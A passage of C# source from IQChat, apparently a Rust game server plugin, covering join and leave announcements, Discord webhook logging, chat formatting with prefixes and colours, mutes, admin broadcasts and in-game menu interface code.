                        }
                        else Message = GetLang("WELCOME_PLAYER_WORLD", player.UserIDString, player.displayName, country);
                        ReplyBroadcast(Message, "", Avatar);
                    }, this);
                }
                else
                {
                    if (Alert.ConnectionAlertRandom)
                    {
                        sb.Clear();
                        int RandomIndex = UnityEngine.Random.Range(0, Alert.RandomConnectionAlert.Count);
                        Message = sb.AppendFormat(Alert.RandomConnectionAlert[RandomIndex], player.displayName).ToString();
                    }
                    else Message = GetLang("WELCOME_PLAYER", player.UserIDString, player.displayName);
                    ReplyBroadcast(Message);
                }
            }
            if (Alert.WelcomeMessageUse)
            {
                int RandomMessage = UnityEngine.Random.Range(0, Alert.WelcomeMessage.Count);
                string WelcomeMessage = Alert.WelcomeMessage[RandomMessage];
                ReplySystem(Chat.ChatChannel.Global, player, WelcomeMessage);
            }
        }      
        void Unload() => WriteData();

        void OnPlayerDisconnected(BasePlayer player, string reason)
        {
            var Alert = config.AlertSettings;
            if (Alert.DisconnectedAlert)
            {
                string Avatar = Alert.ConnectedAvatarUse ? player.UserIDString : "";
                string Message = string.Empty;
                if (Alert.DisconnectedAlertRandom)
                {
                    sb.Clear();
                    int RandomIndex = UnityEngine.Random.Range(0, Alert.RandomDisconnectedAlert.Count);
                    Message = sb.AppendFormat(Alert.RandomDisconnectedAlert[RandomIndex], player.displayName, reason).ToString();
                }
                else Message = config.AlertSettings.DisconnectedReason ? GetLang("LEAVE_PLAYER_REASON", player.UserIDString, player.displayName, reason) : GetLang("LEAVE_PLAYER", player.UserIDString, player.displayName);
                ReplyBroadcast(Message, "", Avatar);
            }
        }
        #endregion

        #region DiscordFunc

        #region FancyDiscord
        public class FancyMessage
        {
            public string content { get; set; }
            public bool tts { get; set; }
            public Embeds[] embeds { get; set; }

            public class Embeds
            {
                public string title { get; set; }
                public int color { get; set; }
                public List<Fields> fields { get; set; }
                public Footer footer { get; set; }
                public Authors author { get; set; }

                public Embeds(string title, int color, List<Fields> fields, Authors author, Footer footer)
                {
                    this.title = title;
                    this.color = color;
                    this.fields = fields;
                    this.author = author;
                    this.footer = footer;

                }
            }

            public FancyMessage(string content, bool tts, Embeds[] embeds)
            {
                this.content = content;
                this.tts = tts;
                this.embeds = embeds;
            }

            public string toJSON() => JsonConvert.SerializeObject(this);
        }

        public class Footer
        {
            public string text { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Footer(string text, string icon_url, string proxy_icon_url)
            {
                this.text = text;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        public class Authors
        {
            public string name { get; set; }
            public string url { get; set; }
            public string icon_url { get; set; }
            public string proxy_icon_url { get; set; }
            public Authors(string name, string url, string icon_url, string proxy_icon_url)
            {
                this.name = name;
                this.url = url;
                this.icon_url = icon_url;
                this.proxy_icon_url = proxy_icon_url;
            }
        }

        public class Fields
        {
            public string name { get; set; }
            public string value { get; set; }
            public bool inline { get; set; }
            public Fields(string name, string value, bool inline)
            {
                this.name = name;
                this.value = value;
                this.inline = inline;
            }
        }

        private void Request(string url, string payload, Action<int> callback = null)
        {
            Dictionary<string, string> header = new Dictionary<string, string>();
            header.Add("Content-Type", "application/json");
            webrequest.Enqueue(url, payload, (code, response) =>
            {
                if (code != 200 && code != 204)
                {
                    if (response != null)
                    {
                        try
                        {
                            JObject json = JObject.Parse(response);
                            if (code == 429)
                            {
                                float seconds = float.Parse(Math.Ceiling((double)(int)json["retry_after"] / 1000).ToString());
                            }
                            else
                            {
                                PrintWarning($" Discord rejected that payload! Responded with \"{json["message"].ToString()}\" Code: {code}");
                            }
                        }
                        catch
                        {
                            PrintWarning($"Failed to get a valid response from discord! Error: \"{response}\" Code: {code}");
                        }
                    }
                    else
                    {
                        PrintWarning($"Discord didn't respond (down?) Code: {code}");
                    }
                }
                try
                {
                    callback?.Invoke(code);
                }
                catch (Exception ex) { }

            }, this, RequestMethod.POST, header);
        }
        #endregion

        void DiscordSendMessage(string key, string WebHooks, ulong userID = 0, params object[] args)
        {
            if (!config.OtherSetting.UseDiscord) return;
            if (String.IsNullOrWhiteSpace(WebHooks)) return;

            List<Fields> fields = new List<Fields>
                {
                    new Fields("IQChat", key, true),
                };

            FancyMessage newMessage = new FancyMessage(null, false, new FancyMessage.Embeds[1] { new FancyMessage.Embeds(null, 635133, fields, new Authors("IQChat", "https://vk.com/mir_inc", "https://i.imgur.com/ILk3uJc.png", null), new Footer("Author: Mercury[vk.com/mir_inc]", "https://i.imgur.com/ILk3uJc.png", null)) });
            Request($"{WebHooks}", newMessage.toJSON());
        }
        #endregion

        #region Func
        public bool IsMutedUser(ulong userID)
        {
            var DataPlayer = ChatSettingUser[userID];
            return DataPlayer.MuteChatTime > CurrentTime() ? true : false;
        }
        private void SeparatorChat(Chat.ChatChannel channel, BasePlayer player, string Message)
        {
            var DataPlayer = ChatSettingUser[player.userID];

            if (IsMutedUser(player.userID))
            {
                ReplySystem(Chat.ChatChannel.Global, player, GetLang("FUNC_MESSAGE_ISMUTED_TRUE", player.UserIDString, FormatTime(TimeSpan.FromSeconds(DataPlayer.MuteChatTime - CurrentTime()))));
                return;
            }

            var RankSettings = config.ReferenceSetting.IQRankSystems;
            var MessageSettings = config.MessageSetting;
            string OutMessage = Message;
            string PrefxiPlayer = "";
            string MessageSeparator = "";
            string ColorNickPlayer = DataPlayer.NickColor;
            string ColorMessagePlayer = DataPlayer.MessageColor;
            string DisplayName = AdminSetting.RenameList.ContainsKey(player.userID) ? AdminSetting.RenameList[player.userID] : player.displayName;

            if (MessageSettings.FormatingMessage)
                OutMessage = $"{Message.ToLower().Substring(0, 1).ToUpper()}{Message.Remove(0, 1).ToLower()}";

            if (MessageSettings.UseBadWords)
                foreach (var DetectedMessage in OutMessage.Split(' '))
                    if (MessageSettings.BadWords.Contains(DetectedMessage.ToLower()))
                    {
                        OutMessage = OutMessage.Replace(DetectedMessage, MessageSettings.ReplaceBadWord);
                        BadWords(player);
                    }

            if (MessageSettings.MultiPrefix)
            {
                if (DataPlayer.MultiPrefix != null)

                    for (int i = 0; i < DataPlayer.MultiPrefix.Count; i++)
                        PrefxiPlayer += DataPlayer.MultiPrefix[i];
            }
            else PrefxiPlayer = DataPlayer.ChatPrefix;

            string ModifiedNick = string.IsNullOrWhiteSpace(ColorNickPlayer) ? player.IsAdmin ? $"<color=#a8fc55>{DisplayName}</color>" : $"<color=#54aafe>{DisplayName}</color>" : $"<color={ColorNickPlayer}>{DisplayName}</color>";
            string ModifiedMessage = string.IsNullOrWhiteSpace(ColorMessagePlayer) ? OutMessage : $"<color={ColorMessagePlayer}>{OutMessage}</color>";
            string ModifiedChannel = channel == Chat.ChatChannel.Team ? "<color=#a5e664>[Team]</color>" : "";

            string Rank = string.Empty;
            string RankTime = string.Empty;
            if (IQRankSystem)
                if (RankSettings.UseRankSystem)
                {
                    if (RankSettings.UseTimeStandart)
                        RankTime = $"{IQRankGetTimeGame(player.userID)}";
                    Rank = $"{IQRankGetRank(player.userID)}";
                }
            MessageSeparator = !String.IsNullOrWhiteSpace(Rank) && !String.IsNullOrWhiteSpace(RankTime) ? $"{ModifiedChannel} [{RankTime}] [{Rank}] {PrefxiPlayer} {ModifiedNick}: {ModifiedMessage}" : !String.IsNullOrWhiteSpace(RankTime) ? $"{ModifiedChannel} [{RankTime}] {PrefxiPlayer} {ModifiedNick}: {ModifiedMessage}" : !String.IsNullOrWhiteSpace(Rank) ? $"{ModifiedChannel} [{Rank}] {PrefxiPlayer} {ModifiedNick}: {ModifiedMessage}" : $"{ModifiedChannel} {PrefxiPlayer} {ModifiedNick}: {ModifiedMessage}";


            if (config.RustPlusSettings.UseRustPlus)
                if (channel == Chat.ChatChannel.Team)
                {
                    RelationshipManager.PlayerTeam Team = RelationshipManager.ServerInstance.FindTeam(player.currentTeam);
                    if (Team == null) return;
                    Util.BroadcastTeamChat(player.Team, player.userID, player.displayName, OutMessage, DataPlayer.MessageColor);
                }

            ReplyChat(channel, player, MessageSeparator);
            AnwserMessage(player, MessageSeparator.ToLower());
            Puts($"{player}: {OutMessage}");
            Log($"СООБЩЕНИЕ В ЧАТ : {player}: {ModifiedChannel} {OutMessage}");
            DiscordSendMessage(GetLang("DISCORD_SEND_LOG_CHAT", player.UserIDString, player.displayName, player.UserIDString, OutMessage, Message), config.OtherSetting.WebhooksChatLog, player.userID);

            RCon.Broadcast(RCon.LogType.Chat, new Chat.ChatEntry
            {
                Message = $"{player.displayName} : {OutMessage}",
                UserId = player.UserIDString,
                Username = player.displayName,
                Channel = channel,
                Time = (DateTime.UtcNow.Hour * 3600) + (DateTime.UtcNow.Minute * 60),
            });
        }

        public void AutoSetupData(string id, string perm)
        {
            var AutoSetup = config.AutoSetupSetting.SetupAutoSetting;
            if (String.IsNullOrWhiteSpace(id)) return;
            if (String.IsNullOrWhiteSpace(perm)) return;
            ulong userID;
            if (!ulong.TryParse(id, out userID)) return;

            if (!ChatSettingUser.ContainsKey(userID)) return;
            var DataPlayer = ChatSettingUser[userID];

            var Prefix = config.PrefixList.FirstOrDefault(x => x.Permissions == perm);
            var ColorChat = config.MessageColorList.FirstOrDefault(x => x.Permissions == perm);
            var ColorNick = config.NickColorList.FirstOrDefault(x => x.Permissions == perm);
            if (AutoSetup.UseSetupAutoPrefix)
                if (Prefix != null)
                {
                    if (!config.MessageSetting.MultiPrefix)
                        DataPlayer.ChatPrefix = Prefix.Argument;
                    else DataPlayer.MultiPrefix.Add(Prefix.Argument);

                    BasePlayer player = BasePlayer.FindByID(userID);
                    if (player != null)
                        ReplySystem(Chat.ChatChannel.Global, player, GetLang("PREFIX_SETUP", player.UserIDString, Prefix.Argument));
                }
            if (AutoSetup.UseSetupAutoColorChat)
                if (ColorChat != null)
                {
                    DataPlayer.MessageColor = ColorChat.Argument;

                    BasePlayer player = BasePlayer.FindByID(userID);
                    if (player != null)
                        ReplySystem(Chat.ChatChannel.Global, player, GetLang("COLOR_CHAT_SETUP", player.UserIDString, ColorChat.Argument));

                }
            if (AutoSetup.UseSetupAutoColorNick)
                if (ColorNick != null)
                {
                    DataPlayer.NickColor = ColorNick.Argument;

                    BasePlayer player = BasePlayer.FindByID(userID);
                    if (player != null)
                        ReplySystem(Chat.ChatChannel.Global, player, GetLang("COLOR_NICK_SETUP", player.UserIDString, ColorNick.Argument));
                }
        }
        public void AutoReturnDefaultData(string id, string perm)
        {
            var AutoReturn = config.AutoSetupSetting.ReturnDefaultSetting;
            if (String.IsNullOrWhiteSpace(id)) return;
            if (String.IsNullOrWhiteSpace(perm)) return;
            ulong userID;
            if (!ulong.TryParse(id, out userID)) return;
            if (!userID.IsSteamId()) return;
            if (!ChatSettingUser.ContainsKey(userID)) return;

            var DataPlayer = ChatSettingUser[userID];

            var Prefix = config.PrefixList.FirstOrDefault(x => x.Permissions == perm);
            var ColorChat = config.MessageColorList.FirstOrDefault(x => x.Permissions == perm);
            var ColorNick = config.NickColorList.FirstOrDefault(x => x.Permissions == perm);

            if (AutoReturn.UseDropPrefix)
                if (Prefix != null)
                {
                    if (config.MessageSetting.MultiPrefix)
                    {
                        if (DataPlayer.MultiPrefix.Contains(Prefix.Argument))
                        {
                            DataPlayer.MultiPrefix.Remove(Prefix.Argument);

                            BasePlayer player = BasePlayer.FindByID(userID);
                            if (player != null)
                                ReplySystem(Chat.ChatChannel.Global, player, GetLang("PREFIX_RETURNRED", player.UserIDString, Prefix.Argument));
                        }
                    }
                    else if (DataPlayer.ChatPrefix == Prefix.Argument)
                    {
                        DataPlayer.ChatPrefix = AutoReturn.PrefixDefault;

                        BasePlayer player = BasePlayer.FindByID(userID);
                        if (player != null)
                            ReplySystem(Chat.ChatChannel.Global, player, GetLang("PREFIX_RETURNRED", player.UserIDString, Prefix.Argument));
                    }
                }
            if (AutoReturn.UseDropColorChat)
                if (ColorChat != null)
                    if (DataPlayer.MessageColor == ColorChat.Argument)
                    {
                        DataPlayer.MessageColor = AutoReturn.MessageDefault;

                        BasePlayer player = BasePlayer.FindByID(userID);
                        if (player != null)
                        ReplySystem(Chat.ChatChannel.Global, player, GetLang("COLOR_CHAT_RETURNRED", player.UserIDString, ColorChat.Argument));

                    }
            if (AutoReturn.UseDropColorNick)
                if (ColorNick != null)
                    if (DataPlayer.NickColor == ColorNick.Argument)
                    {
                        DataPlayer.NickColor = AutoReturn.NickDefault;

                        BasePlayer player = BasePlayer.FindByID(userID);
                        if (player != null)
                            ReplySystem(Chat.ChatChannel.Global, player, GetLang("COLOR_NICK_RETURNRED", player.UserIDString, ColorNick.Argument));
                    }
        }   
        public void AnwserMessage(BasePlayer player, string Message)
        {
            var Anwser = config.AnswerMessages;
            if (!Anwser.UseAnswer) return;

            foreach (var Anwsers in Anwser.AnswerMessageList)
                if (Message.Contains(Anwsers.Key.ToLower()))
                    ReplySystem(Chat.ChatChannel.Global, player, Anwsers.Value);
        }

        public void BroadcastAuto()
        {
            var Alert = config.AlertSettings;
            if (Alert.AlertMessage)
            {
                timer.Every(Alert.MessageListTimer, () =>
                 {
                     var RandomMsg = Alert.MessageList[UnityEngine.Random.Range(0, Alert.MessageList.Count)];
                     ReplyBroadcast(RandomMsg);
                 });
            }
        }
        public void MutePlayer(BasePlayer player, string Format, int ReasonIndex, string ResonCustom = "",string TimeCustom = "", BasePlayer Initiator = null)
        {
            var cfg = config.ReasonListChat[ReasonIndex];
            string Reason = string.IsNullOrEmpty(ResonCustom) ? cfg.Reason : ResonCustom;
            float TimeMute = string.IsNullOrEmpty(TimeCustom) ? cfg.TimeMute : Convert.ToInt32(TimeCustom);
            string DisplayInititator = Initiator == null ? "Администратор" : Initiator.displayName;
            ulong UserIdInitiator = Initiator == null ? 0 : Initiator.userID;
            switch (Format)
            {
                case "mutechat":
                    {
                        ChatSettingUser[player.userID].MuteChatTime = TimeMute + CurrentTime();
                        ReplyBroadcast(GetLang("FUNC_MESSAGE_MUTE_CHAT", player.UserIDString, DisplayInititator, player.displayName, FormatTime(TimeSpan.FromSeconds(TimeMute)), Reason));
                        if (Initiator != null)
                            SetMute(Initiator);
                        DiscordSendMessage(GetLang("DISCORD_SEND_LOG_MUTE", player.UserIDString, DisplayInititator, UserIdInitiator, player.displayName, player.userID, Reason), config.OtherSetting.WebhooksMuteInfo);
                        break;
                    }
                case "unmutechat":
                    {
                        ChatSettingUser[player.userID].MuteChatTime = 0;
                        ReplyBroadcast(GetLang("FUNC_MESSAGE_UNMUTE_CHAT",player.UserIDString), DisplayInititator);
                        break;
                    }
                case "mutevoice":
                    {
                        ChatSettingUser[player.userID].MuteVoiceTime = TimeMute + CurrentTime();
                        ReplyBroadcast(GetLang("FUNC_MESSAGE_MUTE_VOICE", player.UserIDString, DisplayInititator, player.displayName, FormatTime(TimeSpan.FromSeconds(TimeMute)), Reason)); 
                        break;
                    }
            }
        }       
        public void MuteAllChatPlayer(BasePlayer player,float TimeMute = 86400) => ChatSettingUser[player.userID].MuteChatTime = TimeMute + CurrentTime();
        public void RenameFunc(BasePlayer player,string NewName)
        {
            if (permission.UserHasPermission(player.UserIDString, config.RenamePermission))
            {
                if (!AdminSetting.RenameList.ContainsKey(player.userID))
                    AdminSetting.RenameList.Add(player.userID, NewName);
                else AdminSetting.RenameList[player.userID] = NewName;
                ReplySystem(Chat.ChatChannel.Global, player, GetLang("COMMAND_RENAME_SUCCES", player.UserIDString, NewName));
            }
            else ReplySystem(Chat.ChatChannel.Global, player, GetLang("COMMAND_NOT_PERMISSION",player.UserIDString)); 
        }
        void AlertUI(BasePlayer player, string[] arg)
        {
            if (player != null)
                if (!player.IsAdmin) return;

            if (arg.Length == 0 || arg == null)
            {
                ReplySystem(Chat.ChatChannel.Global, player, GetLang("FUNC_MESSAGE_NO_ARG_BROADCAST", player.UserIDString));
                return;
            }
            string Message = "";
            foreach (var msg in arg)
                Message += " " + msg;

            foreach (BasePlayer p in BasePlayer.activePlayerList)
                UIAlert(p, Message);
        }
        void Alert(BasePlayer player, string[] arg)
        {
            if (player != null)
                if (!player.IsAdmin) return;

            if (arg.Length == 0 || arg == null)
            {
                if(player != null)
                ReplySystem(Chat.ChatChannel.Global, player, GetLang("FUNC_MESSAGE_NO_ARG_BROADCAST", player.UserIDString));
                return;
            }
            string Message = "";
            foreach (var msg in arg)
                Message += " " + msg;

            ReplyBroadcast(Message);
            if (config.RustPlusSettings.UseRustPlus)
                foreach(var playerList in BasePlayer.activePlayerList)
                    NotificationList.SendNotificationTo(playerList.userID, NotificationChannel.SmartAlarm, config.RustPlusSettings.DisplayNameAlert, Message, Util.GetServerPairingData());
        }

        #endregion

        #region Interface
        static string MAIN_PARENT = "MAIN_PARENT_UI";
        static string MUTE_MENU_PARENT = "MUTE_MENU_UI";
        static string ELEMENT_SETTINGS = "NEW_ELEMENT_SETTINGS";
        static string MAIN_ALERT_UI = "ALERT_UI_PLAYER";
        static string PANEL_ACTION = "PANEL_ACTION";
        static string PANEL_ACTION_HELPER = "PANEL_ACTION_HELPER";

        #region MainMenu

        public void UI_MainMenu(BasePlayer player)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, MAIN_PARENT);
            var Interface = config.InterfaceSetting;
            float FadeInGlobal = Interface.FadeIn;

            container.Add(new CuiPanel
            {
                CursorEnabled = true,
                RectTransform = { AnchorMin = "0 0", AnchorMax = "1 1" },
                Image = { FadeIn = FadeInGlobal, Color = "0 0 0 0"}
            }, "Overlay", MAIN_PARENT);

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.81875 0.1768519", AnchorMax = "0.9869678 0.8814214" },   
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            },  MAIN_PARENT, PANEL_ACTION);

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.93", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("TITLE_TWO", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
            }, PANEL_ACTION);

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0 0", AnchorMax = "0 0", OffsetMin = "0 -45", OffsetMax = "215 -5" },
                Button = { FadeIn = FadeInGlobal, Close = MAIN_PARENT, Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_CLOSE_BTN", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
            }, PANEL_ACTION);

            #region ACTION BUTTON

            #region SettingPrefix

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.1243169 0.8383705", AnchorMax = "1 0.9179095" },
                Button = { FadeIn = FadeInGlobal, Command = "iq_chat setting prefix", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat"},
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_PREFIX", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
            }, PANEL_ACTION, "PREFIX_SETTING");

            container.Add(new CuiElement
            {
                Parent = "PREFIX_SETTING",
                Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/sign.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
            });

            #endregion

            #region SettingColorNick

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.1243169 0.7371891", AnchorMax = "1 0.8167281" },
                Button = { FadeIn = FadeInGlobal, Command = "iq_chat setting nick", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_COLOR_NICK", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
            }, PANEL_ACTION, "COLOR_NICK_SETTING");

            container.Add(new CuiElement
            {
                Parent = "COLOR_NICK_SETTING",
                Components =
                    {
                        new CuiImageComponent {FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/sign.png"  },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
            });

            #endregion

            #region SettingText

            container.Add(new CuiButton
            {
                RectTransform = { AnchorMin = "0.1243169 0.6346937", AnchorMax = "1 0.7142327" },
                Button = { FadeIn = FadeInGlobal, Command = "iq_chat setting chat", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_COLOR_MSG", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
            }, PANEL_ACTION, "TEXT_SETTING");

            container.Add(new CuiElement
            {
                Parent = "TEXT_SETTING",
                Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/sign.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
            });

            #endregion

            #region SettingRank

            if (IQRankSystem)
                if (config.ReferenceSetting.IQRankSystems.UseRankSystem)
                {
                    container.Add(new CuiButton
                    {
                        RectTransform = { AnchorMin = "0.1243169 0.5282561", AnchorMax = "1 0.6077951" },
                        Button = { FadeIn = FadeInGlobal, Command = "iq_chat setting rank", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                        Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_RANK", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
                    }, PANEL_ACTION, "RANK_SYSTEM");

                    container.Add(new CuiElement
                    {
                        Parent = "RANK_SYSTEM",
                        Components =
                    {
                        new CuiImageComponent {FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/sign.png"  },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
                    });
                }
            #endregion

            #endregion

            #region ADMIN

            #region HELPERS
            if (permission.UserHasPermission(player.UserIDString, PermMuteMenu))
            {
                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.4323258", AnchorMax = "1 0.5171261" },
                    Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_MODER_PANEL", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                }, PANEL_ACTION);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.1243169 0.3298316", AnchorMax = "1 0.4093724" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat mute menu", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_MUTE_MENU_BTN", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
                }, PANEL_ACTION, "CHAT_SETTING_USER");

                container.Add(new CuiElement
                {
                    Parent = "CHAT_SETTING_USER",
                    Components =
                    {
                        new CuiImageComponent {FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/subtract.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
                });
            }
            #endregion

            #region OWNER
            if (player.IsAdmin)
            {
                string CommandChat = "iq_chat admin_chat";
                string TextMuteChatButton = AdminSetting.MuteChatAll ? "UI_TEXT_ADMIN_PANEL_UNMUTE_CHAT_ALL" : "UI_TEXT_ADMIN_PANEL_MUTE_CHAT_ALL";
                string CommandMuteChatButton = AdminSetting.MuteChatAll ? "unmutechat" : "mutechat";
                string CommandVoice = "iq_chat admin_voice";
                string TextMuteVoiceButton = AdminSetting.MuteVoiceAll ? "UI_TEXT_ADMIN_PANEL_UNMUTE_VOICE_ALL" : "UI_TEXT_ADMIN_PANEL_MUTE_VOICE_ALL";
                string CommandMuteVoiceButton = AdminSetting.MuteVoiceAll ? "unmutevoice" : "mutevoice";

                container.Add(new CuiLabel
                {
                    RectTransform = { AnchorMin = "0 0.224706", AnchorMax = "1 0.3042471" },
                    Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TEXT_ADMIN_PANEL", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
                },  PANEL_ACTION);

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.1243169 0.1208954", AnchorMax = "1 0.200437" },
                    Button = { FadeIn = FadeInGlobal, Close = MAIN_PARENT, Command = $"{CommandChat} {CommandMuteChatButton}", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat"},
                    Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage(TextMuteChatButton, this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
                },  PANEL_ACTION, "CHAT_SETTING_ADMIN");

                container.Add(new CuiElement
                {
                    Parent = "CHAT_SETTING_ADMIN",
                    Components =
                    {
                        new CuiImageComponent {FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/subtract.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
                });

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = "0.1243169 0.02496903", AnchorMax = "1 0.1045107" },
                    Button = { FadeIn = FadeInGlobal, Close = MAIN_PARENT, Command = $"{CommandVoice} {CommandMuteVoiceButton}", Color = HexToRustFormat(Interface.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat" },
                    Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage(TextMuteVoiceButton, this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
                },  PANEL_ACTION, "VOICE_SETTING_ADMIN");
            }
            container.Add(new CuiElement
            {
                Parent = "VOICE_SETTING_ADMIN",
                Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.LabelColor), Sprite = "assets/icons/subtract.png" },
                        new CuiRectTransformComponent { AnchorMin = "0.04236809 0.1937432", AnchorMax = "0.1696546 0.7884976" }
                    }
            });

            #endregion
            
            #endregion

            CuiHelper.AddUi(player, container);
        }
        #endregion

        #region PrefixSetting
        public void UI_PrefixSetting(BasePlayer player)
        {
            CuiElementContainer container = new CuiElementContainer();
            CuiHelper.DestroyUi(player, ELEMENT_SETTINGS);
            CuiHelper.DestroyUi(player, MUTE_MENU_PARENT);
            CuiHelper.DestroyUi(player, PANEL_ACTION_HELPER);

            var Interface = config.InterfaceSetting;
            float FadeInGlobal = Interface.FadeIn;

            string Prefix = "";
            if (config.MessageSetting.MultiPrefix)
            {
                if (ChatSettingUser[player.userID].MultiPrefix != null)
                    for (int g = 0; g < ChatSettingUser[player.userID].MultiPrefix.Count; g++)
                        Prefix += ChatSettingUser[player.userID].MultiPrefix[g];
                else Prefix = ChatSettingUser[player.userID].ChatPrefix;
            }
            var PrefixList = config.PrefixList;

            container.Add(new CuiPanel
            {
                RectTransform = { AnchorMin = "0.5020834 0.1148148", AnchorMax = "0.8150954 0.8814815" },
                Image = { FadeIn = FadeInGlobal, Color = HexToRustFormat(Interface.TwoMainColor), Material = "assets/content/ui/uibackgroundblur.mat" }
            }, MAIN_PARENT, ELEMENT_SETTINGS);

            int x = 0, y = 0, i = 0;
            foreach (var ElementPrefix in PrefixList)
            {
                if (!permission.UserHasPermission(player.UserIDString, ElementPrefix.Permissions)) continue;
                string LockStatus = "assets/icons/unlock.png";

                container.Add(new CuiButton
                {
                    RectTransform = { AnchorMin = $"{0 + (x * 0.525)} {0.8514473 - (y * 0.1)}", AnchorMax = $"{0.4708602 + (x * 0.525)} {0.9245502 - (y * 0.1)}" },
                    Button = { FadeIn = FadeInGlobal, Command = $"iq_chat action prefix {ElementPrefix.Argument} {ElementPrefix.Permissions}", Color = HexToRustFormat(config.InterfaceSetting.ButtonColor), Material = "assets/content/ui/uibackgroundblur.mat"},
                    Text = { FadeIn = FadeInGlobal, Text = ElementPrefix.Argument, FontSize = 17, Color = HexToRustFormat(Interface.LabelColor), Align = TextAnchor.MiddleCenter }
                }, ELEMENT_SETTINGS, $"BUTTON_{i}");

                container.Add(new CuiElement
                {
                    Parent = $"BUTTON_{i}",
                    Components =
                    {
                        new CuiImageComponent { FadeIn = FadeInGlobal,  Color = HexToRustFormat(Interface.LabelColor), Sprite = LockStatus },
                        new CuiRectTransformComponent { AnchorMin = "0.03887215 0.1982514", AnchorMax = "0.1660901 0.7930056" }
                    }
                });

                x++;
                if (x == 2)
                {
                    y++;
                    x = 0;
                }
                i++;
            }

            container.Add(new CuiLabel
            {
                RectTransform = { AnchorMin = "0 0.93", AnchorMax = "1 1" },
                Text = { FadeIn = FadeInGlobal, Text = lang.GetMessage("UI_TITLE_NEW_PREFIX_ELEMENT", this, player.UserIDString), Color = HexToRustFormat(Interface.LabelColor), Font = "robotocondensed-bold.ttf", Align = TextAnchor.MiddleCenter }
